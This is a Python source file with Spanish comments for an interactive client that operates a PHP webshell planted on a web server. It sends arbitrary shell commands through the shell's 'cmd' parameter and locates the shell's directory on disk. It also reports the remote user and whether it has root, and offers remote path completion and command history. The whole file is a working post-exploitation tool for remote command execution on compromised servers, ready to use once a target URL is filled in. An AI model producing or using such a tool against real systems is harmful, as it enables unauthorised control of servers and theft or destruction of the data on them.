#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cliente interactivo para webshell PHP mínima (?cmd=...):
- Prompt estilo Kali mostrando SOLO el usuario (via whoami); '#' si root
- Arranca en el directorio donde está alojada la webshell
- Autocompletado con Tab (rutas remotas) con caché e invalidación inteligente
- Historial de sesión (flechas ↑/↓) sin duplicados (readline nativo)
- Parseo robusto con marcadores (ignora HTML extra)
- Transporte AUTO: prueba POST, si falla, usa GET.
- Bloqueo de comandos interactivos sin TTY (su, ssh, nano)
"""

import time
import re
import shlex
import posixpath
import requests
from urllib.parse import urlparse, unquote
from dataclasses import dataclass
from typing import List, Tuple, Optional, Dict

# ======================== Configuración principal ============================

URL = "https://tu-dominio.tld/ruta/a/shell.php"   # <-- Cambia esto por tu URL real
TIMEOUT = 10                                       # Timeout de red (segundos)
REMOTE_CMD_TIMEOUT = 8                             # Timeout remoto por comando
TRANSPORT = "auto"                                 # auto / post / get
VERIFY_TLS = True                                  # Verificar certificado TLS

# Comandos prohibidos en una webshell sin TTY porque cuelgan la petición HTTP
INTERACTIVE_BANS = {"su", "ssh", "nano", "vim", "vi", "top", "htop", "less", "more"}

# ============================ Marcadores de salida ===========================

MARK_START = b"__WBSTART__"
MARK_END   = b"__WBEND__"
MARK_RC    = b"__WBRC__="

try:
    import readline
    _READLINE = True
except ImportError:
    _READLINE = False

# ============================== Estructuras ==================================

@dataclass
class DirEntry:
    name: str
    is_dir: bool

@dataclass
class Identity:
    user: str
    uid: int
    ts: float

# ================================ Cache dirs =================================

class DirCache:
    def __init__(self, ttl: float = 5.0):
        self.ttl = ttl
        self._cache: Dict[str, Tuple[float, List[DirEntry]]] = {}

    def get(self, path: str) -> Optional[List[DirEntry]]:
        hit = self._cache.get(path)
        if not hit:
            return None
        ts, entries = hit
        if time.time() - ts > self.ttl:
            return None
        return entries

    def put(self, path: str, entries: List[DirEntry]) -> None:
        self._cache[path] = (time.time(), entries)

    def invalidate(self, path: Optional[str] = None) -> None:
        if path is None:
            self._cache.clear()
        else:
            self._cache.pop(path, None)

# ============================== Cliente WebShell =============================

class WebShellClient:
    MUTATING_PREFIXES = (
        "mv", "rm", "touch", "mkdir", "rmdir", "cp",
        "chmod", "chown", "truncate", "tar", "unzip", "zip"
    )

    def __init__(self, url: str, timeout: int = 10, transport: str = "auto", verify_tls: bool = True):
        self.url = url
        self.timeout = timeout
        self.transport = transport.lower()
        self.verify_tls = verify_tls

        u = urlparse(self.url)
        self.url_path = unquote(u.path) or "/"
        self.url_basename = posixpath.basename(self.url_path) or "index.php"

        self.sess = requests.Session()
        self.sess.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WebShellClient/2.1",
            "Accept": "*/*",
        })
        
        try:
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            retries = Retry(total=3, backoff_factor=0.3, status_forcelist=[429, 502, 503, 504], raise_on_status=False)
            adapter = HTTPAdapter(max_retries=retries)
            self.sess.mount("http://", adapter)
            self.sess.mount("https://", adapter)
        except Exception:
            pass

        self.cwd = "/"
        self.prev_cwd: Optional[str] = None
        self.remote_home = "/"
        self.dircache = DirCache(ttl=5.0)
        self.find_printf_ok = False
        self._ident: Optional[Identity] = None

        self.cwd = self._init_cwd()
        self.remote_home = self._get_remote_home() or "/"
        self.find_printf_ok = self._detect_find_printf()
        self.identity(refresh=True)

    def _http(self, cmd: str, method: str) -> tuple[int, bytes]:
        params = {"cmd": cmd}
        if method == "POST":
            r = self.sess.post(self.url, data=params, timeout=self.timeout, verify=self.verify_tls)
        else:
            r = self.sess.get(self.url, params=params, timeout=self.timeout, verify=self.verify_tls)
        return r.status_code, r.content

    @staticmethod
    def _extract_payload(content: bytes) -> Tuple[str, Optional[int], bool]:
        i = content.find(MARK_START)
        j = content.rfind(MARK_END)
        if i == -1 or j == -1 or j <= i:
            m = re.search(b"<pre\\b[^>]*>(.*?)</pre>", content, flags=re.S | re.I)
            if m:
                return m.group(1).decode("utf-8", "replace"), None, False
            return content.decode("utf-8", "replace"), None, False

        payload = content[i + len(MARK_START): j]
        rc = None
        k = payload.rfind(MARK_RC)
        if k != -1:
            k2 = payload.find(b"\n", k)
            try:
                rc = int(payload[k + len(MARK_RC): k2 if k2 != -1 else None].strip().decode("ascii"))
            except Exception:
                pass
            payload = payload[:k].rstrip(b"\r\n")

        return payload.decode("utf-8", "replace"), rc, True

    def _wrap_cmd(self, inner_cmd: str, force_cwd: Optional[str] = None) -> str:
        cwd = force_cwd or self.cwd
        qcwd = shlex.quote(cwd)
        guarded = (
            f'if command -v timeout >/dev/null 2>&1; then '
            f'timeout {int(REMOTE_CMD_TIMEOUT)}s sh -c {shlex.quote(inner_cmd)}; '
            f'else sh -c {shlex.quote(inner_cmd)}; fi'
        )
        return (
            f'printf "{MARK_START.decode()}\\n"; '
            f'( cd {qcwd} && {guarded} ); rc=$?; '
            f'printf "\\n{MARK_RC.decode()}%d\\n" "$rc"; '
            f'printf "{MARK_END.decode()}\\n"'
        )

    def _exec_raw(self, wrapped_cmd: str) -> tuple[str, Optional[int]]:
        def run_once(method: str):
            status, content = self._http(wrapped_cmd, method)
            text, rc, found = self._extract_payload(content)
            return status, text, rc, found

        if self.transport == "post":
            return run_once("POST")[1:3]
        if self.transport == "get":
            return run_once("GET")[1:3]

        status, text, rc, found = run_once("POST")
        if found and status < 400:
            return text, rc

        status2, text2, rc2, found2 = run_once("GET")
        if found2:
            return text2, rc2
        return text, rc

    def _exec(self, cmd: str, force_cwd: Optional[str] = None) -> Tuple[str, Optional[int]]:
        return self._exec_raw(self._wrap_cmd(cmd, force_cwd=force_cwd))

    def _guess_script_dir(self) -> Optional[str]:
        p, bn = shlex.quote(self.url_path), shlex.quote(self.url_basename)
        cmd = f'''
p={p}; bn={bn};
roots="$DOCUMENT_ROOT $APACHE_DOCUMENT_ROOT /var/www/html /var/www /usr/share/nginx/html"
for r in $roots; do [ -f "$r$p" ] && dirname "$r$p" && exit 0; done
for r in /var/www /usr/share/nginx/html /srv /opt; do
  [ -d "$r" ] || continue
  found="$(find "$r" -maxdepth 6 -type f -name "$bn" 2>/dev/null | head -n1)"
  [ -n "$found" ] && dirname "$found" && exit 0;
done
echo __NOTFOUND__
'''
        out, _ = self._exec(cmd, force_cwd="/")
        line = (out or "").splitlines()[-1].strip()
        return line if line and line != "__NOTFOUND__" else None

    def _init_cwd(self) -> str:
        try:
            return self._guess_script_dir() or (self._exec("pwd -P || pwd")[0] or "/").splitlines()[-1].strip() or "/"
        except Exception:
            return "/"

    def _get_remote_home(self) -> str:
        try:
            return self._exec('printf "%s" "$HOME"')[0].strip() or "/"
        except Exception:
            return "/"

    def _detect_find_printf(self) -> bool:
        try:
            return self._exec('find . -maxdepth 0 -printf ""')[1] == 0
        except Exception:
            return False

    def identity(self, refresh: bool = False) -> Identity:
        if (not refresh) and self._ident:
            return self._ident

        # Comando directo y simple para evitar problemas de escape o evaluación Bash
        cmd = "id -un 2>/dev/null || whoami 2>/dev/null || echo user; id -u 2>/dev/null || echo -1"
        out, _ = self._exec(cmd, force_cwd="/")
        
        lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
        
        user = "user"
        uid = -1
        
        if len(lines) >= 1:
            user = lines[0]
        if len(lines) >= 2:
            try:
                uid = int(lines[1])
            except ValueError:
                pass
                
        # Fallback de emergencia si devuelve "user"
        if user == "user":
            out_fallback, _ = self._exec("echo $USER", force_cwd="/")
            lines_fb = [ln.strip() for ln in out_fallback.splitlines() if ln.strip()]
            if lines_fb:
                fb_user = lines_fb[-1]
                if fb_user and fb_user != "$USER":
                    user = fb_user
                
        self._ident = Identity(user=user, uid=uid, ts=time.time())
        return self._ident

    def cd(self, path: str) -> Tuple[bool, str]:
        path = path.strip()
        if path in ("", "~", "$HOME"): new_path = self.remote_home
        elif path == "-":
            if not self.prev_cwd: return False, "No hay directorio anterior."
            new_path = self.prev_cwd
        elif path.startswith("/"): new_path = path
        else: new_path = posixpath.normpath(posixpath.join(self.cwd, path))

        q = shlex.quote(new_path)
        out, rc = self._exec(f'test -d {q} && cd {q} && (pwd -P || pwd) || echo __NOPE__')
        if "__NOPE__" in out or rc not in (0, None): return False, f"No existe el directorio: {new_path}"
        self.prev_cwd, self.cwd = self.cwd, out.splitlines()[-1].strip()
        self.dircache.invalidate()
        return True, self.cwd

    def listdir(self, abspath: str) -> List[DirEntry]:
        abspath = posixpath.normpath(abspath) or "/"
        if cached := self.dircache.get(abspath): return cached

        q = shlex.quote(abspath)
        if self.find_printf_ok:
            out, _ = self._exec(f'cd {q} && find . -maxdepth 1 -mindepth 1 -printf "%f\\t%y\\n"')
            entries = [DirEntry(name=ln.split('\t')[0], is_dir=(ln.split('\t')[-1]=='d')) for ln in out.splitlines() if ln]
        else:
            out, _ = self._exec(f'cd {q} && ls -1Ap 2>/dev/null || true')
            entries = [DirEntry(name=n[:-1] if n.endswith('/') else n, is_dir=n.endswith('/')) for n in out.splitlines() if n and n not in (".", "..")]

        self.dircache.put(abspath, entries)
        return entries

    def run(self, line: str) -> str:
        line = line.strip()
        if not line: return ""

        try:
            first_token = shlex.split(line)[0] if line else ""
        except Exception:
            first_token = line.split()[0] if line else ""

        if first_token in INTERACTIVE_BANS:
            return f"[!] El comando '{first_token}' requiere una TTY interactiva y colgará la webshell. Omitido por seguridad."

        if line in ("exit", "quit"): raise KeyboardInterrupt()
        if line == "pwd": return self.cwd
        if line.startswith("cd ") or line == "cd":
            ok, msg = self.cd(line[3:] if line.startswith("cd ") else "~")
            return msg if ok else f"[!] {msg}"
        if line == "refreshid":
            ident = self.identity(refresh=True)
            return f"[+] Usuario actual: {ident.user} (uid={ident.uid})"

        out, _ = self._exec(line, force_cwd=self.cwd)

        if first_token in self.MUTATING_PREFIXES or any(tok in line for tok in (">", ">>")):
            self.dircache.invalidate(self.cwd)

        return out

# ======================= Autocompletado (readline) ===========================

class RemotePathCompleter:
    def __init__(self, client: WebShellClient):
        self.client = client
        if _READLINE: readline.set_completer_delims(' \t\n;|&()<>')

    def candidates(self, token: str) -> List[str]:
        if token.startswith("~"): token = self.client.remote_home + token[1:]
        dir_abs = posixpath.dirname(token) if "/" in token else self.client.cwd
        if not dir_abs.startswith("/"): dir_abs = posixpath.normpath(posixpath.join(self.client.cwd, dir_abs))
        needle = posixpath.basename(token) if not token.endswith("/") else ""
        shown_prefix = token[:len(token)-len(needle)]
        
        try:
            return sorted([f"{shown_prefix}{e.name}/" if e.is_dir else f"{shown_prefix}{e.name}" 
                           for e in self.client.listdir(dir_abs) if e.name.startswith(needle)])
        except Exception: return []

    def __call__(self, text: str, state: int) -> Optional[str]:
        if state == 0: self._matches = self.candidates(readline.get_line_buffer()[readline.get_begidx():readline.get_endidx()] if _READLINE else text)
        return self._matches[state] if state < len(self._matches) else None

# =============================== Main ========================================

def main():
    print("Cliente interactivo para WebShell PHP (Ctrl+C para salir)")
    client = WebShellClient(URL, TIMEOUT, transport=TRANSPORT, verify_tls=VERIFY_TLS)

    if _READLINE:
        readline.parse_and_bind("tab: complete")
        readline.set_completer(RemotePathCompleter(client))
        readline.set_history_length(1000)

    try:
        while True:
            ident = client.identity()
            # Mostramos '#' si es root o tiene uid 0, sino '$'
            sym = '#' if ident.uid == 0 or ident.user == "root" else '$'
            prompt = f"┌──({ident.user})-[{client.cwd}]\n└─{sym} "
            try:
                line = input(prompt)
                if out := client.run(line): 
                    print(out)
            except requests.RequestException as e:
                print(f"[!] Error de red: {e}")
    except (KeyboardInterrupt, EOFError):
        print("\n[+] Cerrando conexión.")

if __name__ == "__main__":
    main()
